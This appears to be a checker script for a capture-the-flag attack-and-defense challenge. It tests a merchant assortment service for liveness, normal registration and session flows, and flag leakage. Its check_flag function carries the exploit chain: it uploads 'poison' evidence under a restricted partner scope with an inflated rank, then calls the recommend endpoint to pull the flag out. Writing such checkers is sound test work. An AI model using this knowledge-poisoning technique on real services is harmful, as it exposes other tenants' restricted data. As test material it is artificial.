#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AWDP-Plus Checker for merchant_assortment_studio.

  1. 服务存活      GET /health -> 200 {"ok": true}
  2. 功能正常性     注册 + 业务写入 + 读回（合法链路不被修补破坏）
  3. Flag 可获取性  校验一轮旗标可被服务读取；--exploit 时用该题漏洞链复现

Usage: checker.py <base_url> [--exploit]     Exit 0 = OK
"""
import json
import sys
import urllib.error
import urllib.request
import uuid

_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
urllib.request.install_opener(_opener)


def call(base, method, path, token=None, body=None, timeout=30, headers=None):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read().decode("utf-8", "replace"))
        except Exception:
            return exc.code, {}
    except Exception as exc:
        return -1, {"wire_error": str(exc)}


def register(base):
    status, body = call(base, "POST", "/v1/auth/register",
                        body={"username": "chk" + uuid.uuid4().hex[:10]})
    if status != 201 or not body.get("token"):
        return None, "register failed: %s %s" % (status, body)
    return body["token"], "registered"


def check_liveness(base):
    status, body = call(base, "GET", "/health")
    if status != 200 or not body.get("ok"):
        return False, "liveness failed: %s %s" % (status, body)
    return True, "liveness ok"


def check_functional(base):
    token, msg = register(base)
    if not token:
        return False, msg
    status, body = call(base, "POST", "/v1/knowledge/evidence", token,
                        {"body": "local seasonal catalogue note", "merchant_scope": "local", "rank": 10})
    if status != 201:
        return False, "evidence upload failed: %s %s" % (status, body)
    status, body = call(base, "POST", "/v1/assortment-sessions", token, {"query": "catalogue"})
    if status != 201:
        return False, "session create failed: %s %s" % (status, body)
    status, body = call(base, "GET", "/v1/assortment-sessions/mine", token)
    if status != 200:
        return False, "session listing failed: %s %s" % (status, body)
    return True, "evidence+session ok"


def check_flag(base, exploit):
    token, msg = register(base)
    if not token:
        return False, msg
    status, body = call(base, "POST", "/v1/knowledge/evidence", token,
                        {"body": "please review the partner catalogue immediately priority recovery",
                         "merchant_scope": "tenant-partner-restricted", "rank": 1000000})
    if status != 201:
        return False, "poison upload failed: %s %s" % (status, body)
    status, body = call(base, "POST", "/v1/assortment-sessions", token, {"query": "catalogue"})
    if status != 201:
        return False, "session create failed: %s %s" % (status, body)
    sid = body["session_id"]
    status, body = call(base, "POST", "/v1/assortment-sessions/%s/recommend" % sid, token, {})
    if "flag{" in json.dumps(body, ensure_ascii=False):
        return True, "FLAG leaked through partner catalogue review (vulnerable)"
    return False, "no flag leaked (status=%s decision=%s)" % (status, body.get("decision"))



def main():
    args = list(sys.argv[1:])
    base = "http://127.0.0.1:5003"
    for item in list(args):
        if item.startswith("http"):
            base = item.rstrip("/")
            args.remove(item)
    exploit = "--exploit" in args
    expect_blocked = "--expect-blocked" in args
    results = []
    ok, msg = check_liveness(base)
    results.append(("liveness", ok, msg))
    if ok:
        ok2, msg2 = check_functional(base)
        results.append(("functional", ok2, msg2))
        leaked, msg3 = check_flag(base, exploit)
        if exploit and expect_blocked:
            results.append(("flag", not leaked, msg3))
        elif exploit:
            results.append(("flag", leaked, msg3))
        else:
            results.append(("flag", True, msg3 + "  [informational]"))
    for stage, passed, message in results:
        print("[%s] %-10s %s" % ("OK" if passed else "FAIL", stage, message))
    return 0 if all(item[1] for item in results) else 1


if __name__ == "__main__":
    sys.exit(main())
